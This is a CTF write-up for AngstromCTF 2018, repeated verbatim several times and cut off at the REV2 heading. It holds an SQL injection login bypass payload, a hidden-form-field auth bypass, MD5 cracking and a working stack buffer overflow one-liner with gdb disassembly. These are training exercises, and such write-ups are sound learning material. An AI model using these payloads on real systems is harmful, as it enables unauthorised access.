This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
